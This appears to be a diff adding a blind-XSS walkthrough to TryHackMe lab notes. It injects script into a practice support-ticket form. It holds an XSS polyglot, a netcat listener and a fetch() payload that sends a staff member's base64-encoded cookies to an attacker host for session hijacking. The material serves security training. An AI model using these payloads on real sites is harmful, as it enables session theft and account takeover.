@@ -300,4 +300,95 @@ An XSS polyglot is a string of text which can escape attributes, tags and bypass
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
 
 
+* Practical Example (Blind XSS)
+  
+  For the last task, we're going to go over a Blind XSS vulnerability. Make sure you terminate the previous machine and then click on the green Start Machine button on the right to load the Acme IT Support website. You'll need to either by connected to the TryHackMe VPN or open the AttackBox using the blue button at the top of the page. Once loaded, click on the link below or open it inside using the AttackBox browser to view the target website.
+
+
+https://10-10-166-64.p.thmlabs.com
+
+
+Click on the Customers tab on the top navigation bar and click the "Signup here" link to create an account. Once your account gets set up, click the Support Tickets tab, which is the feature we will investigate for weaknesses. 
+
+
+Try creating a support ticket by clicking the green Create Ticket button, enter the subject and content of just the word test and then click the blue Create Ticket button. You'll now notice your new ticket in the list with an id number which you can click to take you to your newly created ticket. 
+
+
+Like task three, we will investigate how the previously entered text gets reflected on the page. Upon viewing the page source, we can see the text gets placed inside a textarea tag.
+
+
+
+
+
+Let's now go back and create another ticket. Let's see if we can escape the textarea tag by entering the following payload into the ticket contents:
+
+
+</textarea>test
+
+
+Again, opening the ticket and viewing the page source, we've successfully escaped the textarea tag.
+
+
+
+
+
+Let's now expand on this payload to see if we can run JavaScript and confirm that the ticket creation feature is vulnerable to an XSS attack. Try another new ticket with the following payload:
+
+
+ </textarea><script>alert('THM');</script>
+
+
+Now when you view the ticket, you should get an alert box with the string THM. We're going to now expand the payload even further and increase the vulnerabilities impact. Because this feature is creating a support ticket, we can be reasonably confident that a staff member will also view this ticket which we could get to execute JavaScript. 
+
+
+Some helpful information to extract from another user would be their cookies, which we could use to elevate our privileges by hijacking their login session. To do this, our payload will need to extract the user's cookie and exfiltrate it to another webserver server of our choice. Firstly you'll need to set up a listening server to receive the information; we'll discuss two methods of doing this:
+
+
+One:
+
+If you're connected to the TryHackMe VPN or using the TryHackMe AttackBox, you could set up a listening server using Netcat:
+
+
+nc
+
+           
+user@machine$ nc -nlvp 9001
+
+        
+
+
+Two:
+
+You can use the TryHackMe request catcher at http://10.10.10.100 (you must be connected to the TryHackMe VPN network or using the browser in an AttackBox for this to work). This service provides a unique URL that receives and displays HTTP and DNS requests made to it.
+
+
+Now that you've decided on the method of receiving the exfiltrated information, let's build the payload.
+
+
+</textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>
+
+
+Let's breakdown the payload:
+
+The </textarea> tag closes the textarea field. 
+
+The <script>tag opens open an area for us to write JavaScript.
+
+The fetch() command makes an HTTP request.
+
+{URL_OR_IP} is either the THM request catcher URL or your IP address from the THM AttackBox or your IP address on the THM VPN Network.
+
+?cookie= is the query string that will contain the victim's cookies.
+
+btoa() command base64 encodes the victim's cookies.
+
+document.cookie accesses the victim's cookies for the Acme IT Support Website.
+
+</script>closes the JavaScript code block.
+
+
+Now create another ticket using the above payload, making sure to swap out the {URL_OR_IP} variable to your settings (make sure to specify the port number as well, in case you are using Method One). Now, wait up to a minute, and you'll see the request come through containing the victim's cookies. 
+
+
+You can now base64 decode this information using a site like https://www.base64decode.org/, giving you the necessary information to answer the below question.
 
